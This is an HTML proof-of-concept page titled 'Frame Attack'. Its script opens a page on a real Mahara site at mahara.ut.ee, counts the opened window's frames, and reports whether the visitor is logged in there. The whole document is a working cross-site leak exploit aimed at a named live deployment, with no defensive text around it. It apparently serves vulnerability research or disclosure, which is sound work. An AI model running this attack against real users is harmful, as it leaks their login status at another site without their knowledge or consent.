<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Frame Attack</title>
    </head>
    <body>
    <button onClick="checkLogin()">Check login status</button>
    <span id="result"></span>
    </body>
<script>
    function checkLogin() {
        const win = window.open("https://mahara.ut.ee/artefact/digicv/teaching.php?id=addteaching_overview_description_ifr");

        setTimeout(() => {
            try {
                const frameCount = win.length;
                document.getElementById('result').textContent =
                    frameCount > 0 ? 'User is logged in' : 'User is not logged in';
            } catch (e) {
                document.getElementById('result').textContent = 'User is not logged in';
            }
            win.close();
        }, 1000);
    }
</script>
</html>